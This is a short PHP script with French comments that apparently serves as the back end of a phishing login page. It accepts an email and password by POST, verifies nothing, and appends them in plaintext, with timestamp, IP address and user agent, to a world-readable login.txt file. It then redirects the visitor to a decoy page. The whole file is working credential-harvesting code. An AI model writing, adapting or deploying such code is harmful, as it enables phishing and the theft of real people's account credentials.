<?php
// Activation du débogage
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupération des données
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Validation
    if (empty($email) || empty($password)) {
        die(json_encode(['error' => 'Email et mot de passe requis']));
    }

    // Préparation des données
    $logData = [
        'date' => date('Y-m-d H:i:s'),
        'email' => htmlspecialchars($email),
        'password' => htmlspecialchars($password),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT']
    ];

    // Chemin absolu du fichier
    $logFile = __DIR__.'/login.txt';
    
    try {
        // Création du fichier si inexistant
        if (!file_exists($logFile)) {
            if (!touch($logFile)) {
                throw new Exception("Impossible de créer le fichier");
            }
            chmod($logFile, 0644);
        }

        // Vérification des permissions
        if (!is_writable($logFile)) {
            throw new Exception("Permissions insuffisantes");
        }

        // Formatage des données
        $logEntry = "=== CONNEXION ===\n";
        foreach ($logData as $key => $value) {
            $logEntry .= ucfirst($key).": ".$value."\n";
        }
        $logEntry .= "================\n\n";

        // Écriture
        if (file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX) === false) {
            throw new Exception("Échec de l'écriture");
        }

        // Redirection
        header("Location: mer.html");
        exit();

    } catch (Exception $e) {
        error_log("Erreur login.php: ".$e->getMessage());
        header("HTTP/1.1 500 Erreur serveur");
        die("Erreur temporaire. Veuillez réessayer.");
    }
} else {
    header("HTTP/1.1 403 Forbidden");
    die("Accès non autorisé");
}
